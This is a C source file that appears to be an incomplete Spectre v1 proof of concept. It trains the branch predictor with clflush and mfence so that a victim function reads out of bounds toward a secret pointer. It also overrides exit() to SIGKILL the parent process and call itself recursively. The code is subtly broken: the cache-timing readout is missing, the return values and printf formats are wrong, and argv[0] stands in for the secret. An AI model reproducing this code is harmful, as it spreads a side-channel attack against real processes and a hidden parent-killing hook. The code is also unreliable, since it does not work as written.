#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <signal.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt",on)
#else
#include <x86intrin.h>
#endif

#ifndef L1_CACHE_LINE_SIZE
#define L1_CACHE_LINE_SIZE 64
#endif

#define CACHE_HIT_TRESHOLD 80
#define ARRAY1_SIZE 16
#define TRIES 1000


void exit(int status);

void exit(int status){
  // kill the parent
  kill(getppid(), SIGKILL);
  exit(status);
}

// Global variables
unsigned int array1_size = 16;
uint8_t unused1[L1_CACHE_LINE_SIZE];// used to ensure that array1 and 2 are in different cache lines
uint8_t array1[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
                      10, 11, 12, 13, 14, 15};
uint8_t unused2[L1_CACHE_LINE_SIZE];// same thing as unused1
uint8_t array2[256 * 512];
int results[256];
uint8_t temp = 0; /* To not optimize out victim_function() */

void victim_function(size_t x){
	if(x < array1_size){
		temp &= array2[array1[x] * 512];
	}
}

int probe_memory_byte(size_t offset){
	size_t training_x, x;
  memset(results, 0, sizeof(results));
  
  for(int i=0; i<TRIES; i++){
		// flush the whole array2 from cache
    for (int j=0; j<256; j++){
      _mm_clflush(&array2[j*512]);
    }
		// 5 training runs for each attack run
		training_x = i % array1_size;
    for (int j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size); // flush the array1_size from cache to force a cache miss
			_mm_mfence(); // delay to ensure that the clflush is finished

      // Fancy way to set x to a value smaller that array1_size if every 6th iteration
			// This is used to train the bredictor to predict the branch to be taken
			// in the conditional branch of the victim function
      x = ((j % 6) - 1) & ~0xFFFF; 
      x = (x | (x >> 16));
      x = training_x ^ (x & (offset ^ training_x));

      /* Call the victim! */
      victim_function(x);
    }
  }
}

int main(int argc,char** argv){
  // print argv 
  printf("argv: %s\n", argv);

  uint8_t* secret_ptr = argv[0];
  uint8_t size = atoi(argv[1]);

	size_t offset = (secret_ptr - (uint8_t*)array1);

	printf("secret_ptr: %p, size: %d\n, array1: %p ,offset %d\n", secret_ptr, size, array1, offset);

	probe_memory_byte(offset);

  
}
